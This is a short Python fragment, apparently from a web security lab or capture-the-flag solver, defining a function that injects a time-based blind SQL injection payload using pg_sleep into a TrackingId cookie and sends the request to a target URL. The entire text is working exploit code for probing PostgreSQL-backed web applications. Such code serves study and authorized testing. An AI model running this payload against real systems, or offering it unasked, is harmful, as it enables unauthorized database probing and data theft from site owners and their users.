...
def _try_delay(s, url, path, delay):
    target_url = url + path
    sql_injection = f"'||pg_sleep({delay})--"
    cookies = { 'TrackingId': s.cookies.get('TrackingId') + sql_injection }
    s.get(target_url, cookies=cookies)
